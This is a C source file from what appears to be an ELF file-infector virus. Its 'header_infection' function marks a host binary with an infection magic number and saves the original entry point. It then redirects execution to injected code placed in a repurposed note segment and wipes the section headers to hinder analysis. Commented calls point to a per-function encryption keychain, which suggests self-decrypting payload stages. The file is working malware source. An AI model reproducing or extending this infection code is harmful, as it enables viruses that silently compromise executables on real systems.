#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// ASM VOLATILE
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline int _open(const char *pathname, int flags, mode_t mode)
{
	int ret;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov esi, %1\n"
		"mov edx, %2\n"

		"mov rax, 0x2\n"
		"syscall\n"
		:
		: "g"(pathname), "g"(flags), "g"(mode)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline int _close(int fd)
{
	int ret;

	asm volatile
	(
		"mov edi, %0\n"

		"mov rax, 0x3\n"
		"syscall\n"
		:
		: "g"(fd)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline ssize_t _write(int fd, const void *buf, size_t count)
{
	ssize_t ret;

	asm volatile
	(
		"mov edi, %0\n"
		"mov rsi, %1\n"
		"mov rdx, %2\n"

		"mov rax, 0x1\n"
		"syscall\n"
		:
		: "g"(fd), "g"(buf), "g"(count)
	);
	asm volatile
	(
		"mov %0, rax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline size_t _strlen(const char *str)
{
	size_t ret = 0;

	if (str == NULL)
		return 0;

	while (str[ret])
		ret++;

	return ret;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_left(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);

#if DEBUG
	char function[] = "header_infection:\t";
	char name[] = "/tmp/trace";
	int trace = _open(name, O_RDWR | O_APPEND, 0000);
	char newline = 0xa;
	char result = context + 48;
	
	if (trace > 0)
	{
		_write(trace, function, _strlen(function));
		_write(trace, &result, 1);
		_write(trace, &newline, 1);
	}

	_close(trace);
#endif

	if (context == FAILURE)
		goto label;

	*(unsigned int *)&host->header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;

	host->old_entry = host->header->e_entry;
	host->header->e_entry = host->note->self->p_vaddr;
	host->new_entry = host->header->e_entry;

	host->header->e_shoff = 0;
	host->header->e_shnum = 0;
	host->header->e_shstrndx = 0;

label:
//	update_keychain_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
//	decrypt_left(keychain, (char *)injection, (void *)autodestruction - (void *)injection);

	injection(host, keychain, context);
}
